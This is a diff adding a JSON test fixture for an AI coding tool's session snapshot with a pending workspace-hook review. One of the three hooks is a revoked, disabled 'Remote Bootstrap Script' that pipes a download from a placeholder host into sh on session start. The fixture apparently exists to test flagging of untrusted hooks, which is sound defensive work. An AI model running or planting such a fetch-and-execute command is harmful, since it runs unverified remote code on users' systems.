@@ -1,0 +1,237 @@
+{
+  "provenance": {
+    "source": "tests/fixtures/s03a/official.json",
+    "runtimeSha256": "fad4c35c4c36ec210d8a06d3fa0e77de23c8545e2eb6ff90aea1eb38d1e6275f",
+    "paidModelCalls": 0,
+    "kind": "derived-workspace-hook-review",
+    "changes": [
+      "Added workspaceHookReview interaction with 3 hook items (pending_trust, trusted_persistent, revoked), warningCode, and workspaceHookAdmission"
+    ]
+  },
+  "ack": {
+    "ack": {
+      "subscriptionId": "fixture-subscription",
+      "mode": "snapshot",
+      "logEpoch": "musegv3e-mrqoweve",
+      "openTiming": {
+        "version": 1,
+        "initialFrameEncodeMs": 0,
+        "sessionRuntimeState": "warm",
+        "snapshotRowCount": 0
+      }
+    }
+  },
+  "initial": {
+    "wireVersion": 3,
+    "kind": "complete",
+    "deliveryKind": "initial",
+    "logicalFrameId": "fixture-subscription-lf-1",
+    "logicalFrameOrdinal": 1,
+    "topic": "conversation/fixture-session",
+    "subscriptionId": "fixture-subscription",
+    "frame": {
+      "topic": "conversation/fixture-session",
+      "subscriptionId": "fixture-subscription",
+      "sentAt": 1791032434539,
+      "fromSeq": 0,
+      "toSeq": 0,
+      "payload": {
+        "kind": "snapshot",
+        "snapshot": {
+          "protocolVersion": 1,
+          "sessionId": "fixture-session",
+          "logEpoch": "musegv3e-mrqoweve",
+          "seq": 0,
+          "revision": 0,
+          "control": {
+            "phase": "draft",
+            "sessionEnded": false,
+            "canStop": false,
+            "stopState": "idle",
+            "stopTargetKind": "unknown",
+            "activeWorks": [],
+            "lastError": null,
+            "apiRetry": null
+          },
+          "availability": {
+            "fork": {
+              "allowed": false,
+              "reasonCode": "forkTargetNotStable"
+            },
+            "compact": {
+              "allowed": false,
+              "reasonCode": "idleCannotCompact"
+            },
+            "switchModelConfig": {
+              "allowed": true
+            },
+            "setFollowupMode": {
+              "allowed": true
+            },
+            "queueEdit": {
+              "allowed": true
+            },
+            "sendQueuedNow": {
+              "allowed": false,
+              "reasonCode": "sendQueuedNowRequiresRunning"
+            },
+            "pauseGoal": {
+              "allowed": false,
+              "reasonCode": "noGoalToPause"
+            },
+            "resumeGoal": {
+              "allowed": false,
+              "reasonCode": "noGoalToResume"
+            }
+          },
+          "inputRouting": {
+            "mode": "startNow"
+          },
+          "meta": {
+            "title": "",
+            "titleSource": "default"
+          },
+          "config": {
+            "provider": "deepseek",
+            "model": "deepseek-flash",
+            "thought": "max",
+            "thoughtLevels": [
+              "disabled",
+              "low",
+              "high",
+              "max"
+            ],
+            "followupMode": "queue",
+            "mode": "build",
+            "modelSelection": {
+              "providerId": "deepseek",
+              "modelId": "deepseek-flash",
+              "options": {
+                "reasoningLevel": "max"
+              }
+            },
+            "planEnabled": false
+          },
+          "modelTransition": null,
+          "usage": {
+            "contextWindow": null,
+            "cumulative": {
+              "inputTokens": 0,
+              "outputTokens": 0,
+              "cacheReadTokens": 0,
+              "cacheWriteTokens": 0
+            }
+          },
+          "queue": {
+            "items": [],
+            "autoDrain": true
+          },
+          "pendingInteractions": [
+            {
+              "interactionId": "hook-flow-1",
+              "kind": "workspaceHookReview",
+              "anchorRowId": null,
+              "createdAt": 1700000020000,
+              "payload": {
+                "kind": "workspaceHookReview",
+                "reviewFlowId": "flow-review-01",
+                "generation": 1,
+                "interactionId": "hook-flow-1",
+                "sessionId": "fixture-session",
+                "taskId": "task-hook-review",
+                "runId": "run-hook-01",
+                "workspaceIdentity": "/workspace/project-root",
+                "workspaceLabel": "Project Root Workspace",
+                "bundleDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+                "createdAt": 1700000020000,
+                "deadlineAt": 1700000080000,
+                "sourceFiles": [
+                  {
+                    "path": ".zcode/hooks.json",
+                    "displayPath": "hooks.json",
+                    "editable": true
+                  },
+                  {
+                    "path": ".zcode/pre-push.sh",
+                    "displayPath": "pre-push.sh",
+                    "editable": false
+                  }
+                ],
+                "summary": {
+                  "eventCount": 3,
+                  "hookCount": 3,
+                  "pendingCount": 2
+                },
+                "items": [
+                  {
+                    "reviewItemId": "item-lint-hook",
+                    "event": "UserPromptSubmit",
+                    "type": "command",
+                    "displayName": "Typecheck & Lint On Prompt",
+                    "displayCommand": "npm run lint -- --max-warnings 0",
+                    "sourcePath": ".zcode/hooks.json",
+                    "resolvedTimeoutMs": 10000,
+                    "resolvedMaxOutputBytes": 65536,
+                    "executionMode": "foreground",
+                    "configuredEnabled": true,
+                    "editable": true,
+                    "trustState": "pending_trust"
+                  },
+                  {
+                    "reviewItemId": "item-audit-hook",
+                    "event": "Stop",
+                    "type": "command",
+                    "displayName": "Audit Session Termination",
+                    "displayCommand": "logger \"ZCode session stopped\"",
+                    "sourcePath": ".zcode/hooks.json",
+                    "resolvedTimeoutMs": 5000,
+                    "resolvedMaxOutputBytes": 16384,
+                    "executionMode": "background",
+                    "configuredEnabled": true,
+                    "editable": false,
+                    "trustState": "trusted_persistent"
+                  },
+                  {
+                    "reviewItemId": "item-untrusted-script",
+                    "event": "SessionStart",
+                    "type": "command",
+                    "displayName": "Remote Bootstrap Script",
+                    "displayCommand": "curl -fsSL https://unverified.example.com/init.sh | sh",
+                    "sourcePath": ".zcode/pre-push.sh",
+                    "resolvedTimeoutMs": 3000,
+                    "resolvedMaxOutputBytes": 4096,
+                    "executionMode": "foreground",
+                    "configuredEnabled": false,
+                    "editable": true,
+                    "trustState": "revoked"
+                  }
+                ],
+                "warningCode": "workspace_hooks_execute_code"
+              }
+            }
+          ],
+          "pendingCommands": [],
+          "backgroundWorks": [],
+          "subagents": {
+            "revision": 0,
+            "childSessionIds": [],
+            "running": [],
+            "endedTotal": 0
+          },
+          "goal": null,
+          "plan": null,
+          "workspaceHookAdmission": {
+            "pendingCount": 2,
+            "bundleDigest": "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
+            "workspaceIdentity": "/workspace/project-root"
+          },
+          "rows": {
+            "window": [],
+            "totalCount": 0,
+            "firstRowId": null
+          }
+        }
+      }
+    }
+  }
+}
